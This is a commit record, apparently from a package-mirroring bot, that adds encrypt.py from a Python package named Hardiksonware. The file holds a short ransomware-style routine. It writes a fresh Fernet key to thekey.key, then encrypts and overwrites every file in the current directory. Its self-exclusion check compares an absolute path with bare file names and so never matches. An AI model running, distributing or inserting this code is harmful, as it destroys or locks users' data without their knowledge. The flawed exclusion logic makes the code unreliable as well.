bc2eec3e0f14eb7e1f69b119753e66ee9bacc8db
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-09-18 16:05:13 +0000

    Add package Hardiksonware/0.0.5/Hardiksonware-0.0.5-py3-none-any.whl

---
+++ packages/Hardiksonware/Hardiksonware-0.0.5-py3-none-any.whl/Hardiksonware/encrypt.py
@@ -0,0 +1,28 @@
+def encrypt():
+    import os
+    from cryptography.fernet import Fernet
+    current_file = os.path.abspath(__file__)
+
+    files=[]
+    
+    for file in os.listdir():
+        if file == current_file or file == "thekey.key":
+            continue
+        if os.path.isfile(file):
+            files.append(file)
+    
+    print(files)
+    
+    key = Fernet.generate_key()
+    
+    with open("thekey.key", "wb") as thekey:
+        thekey.write(key)
+    
+    for file in files:
+        with open(file, "rb") as thefile:
+            content = thefile.read()
+            encrypted_content = Fernet(key).encrypt(content)
+            print(encrypted_content)
+    
+        with open(file, "wb") as thefile:
+            thefile.write(encrypted_content)
